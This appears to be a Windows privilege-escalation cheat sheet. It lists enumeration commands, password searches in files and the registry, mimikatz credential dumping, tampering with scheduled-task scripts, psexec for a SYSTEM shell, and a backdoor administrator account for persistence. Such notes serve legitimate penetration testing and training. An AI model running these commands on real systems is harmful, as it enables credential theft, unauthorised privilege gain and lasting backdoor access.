
# Windows Privilege Escalation Guide

## 1. Enumeration (Know Your Environment)

- **System Information**:
  ```powershell
  systeminfo                  # Get detailed system information  
  hostname                    # Display the hostname  
  whoami                      # Current user  
  whoami /priv                # User privileges  
  ```

- **Network Information**:
  ```powershell
  ipconfig /all               # Network interfaces and details  
  netstat -ano                # Active network connections and listening ports  
  arp -a                      # View the ARP table  
  ```

- **User and Group Info**:
  ```powershell
  net user                    # List all users  
  net localgroup administrators  # Check administrators group  
  ```

---

## 2. Search for Weak File Permissions

- **Find Accessible Files**:
  ```powershell
  icacls C:\path\to\file    # View file permissions  
  ```

- **Search for Writable Directories**:
  ```powershell
  dir /s /b | findstr /i /c:"writable"  
  ```

- **Find Sensitive Files**:
  ```powershell
  findstr /si "password" *.txt *.config *.ini  
  ```

---

## 3. Misconfigurations in Scheduled Tasks

- **List Scheduled Tasks**:
  ```powershell
  schtasks /query /fo LIST /v  
  ```

- **Check for Writable Scripts**:
  - If a script in a scheduled task is writable, inject malicious commands to escalate privileges.

---

## 4. Misconfigured Services

- **List Services**:
  ```powershell
  sc query state= all  
  ```

- **Find Services Running as SYSTEM**:
  ```powershell
  wmic service where "state='running'" get name,displayname,startmode  
  ```

- **Check for Writable Services**:
  - Use tools like `accesschk` to identify writable services:
    ```
    accesschk.exe -uwcqv "ServiceName"  
    ```

---

## 5. Vulnerable Applications

- **List Installed Programs**:
  ```powershell
  wmic product get name,version,vendor  
  ```

- **Check Versions**:
  - Compare installed versions with public CVE databases to identify vulnerabilities.

---

## 6. Exploiting Credentials

- **Search for Stored Credentials**:
  ```powershell
  reg query HKCU /f "password" /t REG_SZ /s  
  reg query HKLM /f "password" /t REG_SZ /s  
  ```

- **Dump Passwords**:
  - Use `mimikatz` to extract credentials:
    ```
    mimikatz.exe  
    privilege::debug  
    sekurlsa::logonpasswords  
    ```

---

## 7. Abusing SUDO-Like Commands

- **PowerShell Execution**:
  - If execution policy allows:
    ```powershell
    Start-Process powershell -Verb runAs  
    ```

- **Runas Command**:
  ```cmd
  runas /user:Administrator cmd  
  ```

---

## 8. Kernel Exploits

- **Check OS and Patch Level**:
  ```powershell
  systeminfo | findstr /B /C:"OS Name" /C:"OS Version"  
  ```

- **Search for Exploits**:
  - Use online resources like Exploit-DB to find kernel-level vulnerabilities for the specific OS version.

---

## 9. Tools for Automation

- **WinPEAS** (Privilege Escalation Script):
  ```cmd
  winpeas.exe  
  ```

- **PowerUp** (PowerShell Script for Privilege Escalation):
  ```powershell
  Import-Module .\PowerUp.ps1  
  Invoke-AllChecks  
  ```

- **SharpUp** (C# Privilege Escalation Tool):
  ```cmd
  SharpUp.exe  
  ```

## 10. Post-Exploitation Tips

- **Open a SYSTEM Shell**:
  ```cmd
  psexec.exe -s -i cmd.exe  
  ```

- **Persistence**:
  - Create a new admin user:
    ```cmd
    net user hacker password123 /add  
    net localgroup administrators hacker /add  
    ```
